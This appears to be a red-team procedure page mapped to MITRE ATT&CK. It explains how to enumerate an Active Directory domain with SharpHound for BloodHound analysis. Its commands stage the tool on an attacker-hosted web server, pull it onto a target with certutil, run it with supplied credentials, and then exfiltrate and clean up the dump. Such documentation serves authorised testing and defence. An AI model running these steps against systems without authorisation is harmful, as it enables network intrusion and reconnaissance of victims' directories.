---
id: d9c6fcf5-ebc7-4439-ac83-807ec8734fae
name: Map an Active Directory Environment (SharpHound)
type: procedure
verified: true
submitted: true
created_at: '2020-03-15T23:15:05.189638+00:00'
updated_at: '2023-05-25T19:44:18.124287+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
- '[[Permission Groups Discovery|T1069 - Permission Groups Discovery]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
- '[[Enumeration]]'
commands:
- '[[Download from a Remote HTTP Server (certutil)]]'
- '[[Launch a Python 3 Web Server]]'
- '[[SharpHound Ingest AD Domain Information and Dump Results to File]]'
---

# Map an Active Directory Environment (SharpHound)

**Status**: ✓ Verified

## Summary

Use SharpHound to connect to an Active Directory environment and enumerate objects such as users, groups, ACLs, trusts, etc. This data then can be imported into BloodHound for analysis of objects, their relationships, and potential vulnerabilities. 

## Description

# Description

Use SharpHound to connect to an Active Directory environment and enumerate objects such as users, groups, ACLs, trusts, etc. This data then can be imported into BloodHound for analysis of objects, their relationships, and potential vulnerabilities. 





## Objectives

SharpHound is a tool that is commonly used by both red and blue teams to enumerate objects in an Active Directory environment, including users, groups, ACLs, trusts, and other information. This information can be used by an attacker to gain a better understanding of the environment, identify potential attack paths, and plan their next steps.



1. Transfer the sharphound tool to the target machine

2. Ingest the AD information and Dump the results to a file

3. Exfiltrate the file from the machine

4. Clean up the sharphound tool and dump file.



# Instructions

1. Download the latest copy of SharpHound: [Download from GitHub](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors)

2. Create a web server to host the file, then copy it to the target.



On the attacker:





**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```





On the target:





**Command** ([[Download from a Remote HTTP Server (certutil)]]):

```bash
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" "$_PATH/$_FILENAME"
```





3. Execute SharpHound.exe, specifying domain, user and password.





**Command** ([[SharpHound Ingest AD Domain Information and Dump Results to File]]):

```bash
SharpHound.exe -c All -d $_DOMAIN --ldapusername $_USER --ldappassword $_PASSWORD
```



Note: While it may be less accurate, SharpHound can enumerate environments remotely from a non-domain joined computer by including the "-domaincontroller" argument with the DC's IP.

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Permission Groups Discovery|T1069 - Permission Groups Discovery]]

## Commands Used

- [[Download from a Remote HTTP Server (certutil)]]
- [[Launch a Python 3 Web Server]]
- [[SharpHound Ingest AD Domain Information and Dump Results to File]]

## Tags

- [[Active Directory]]
- [[Enumeration]]


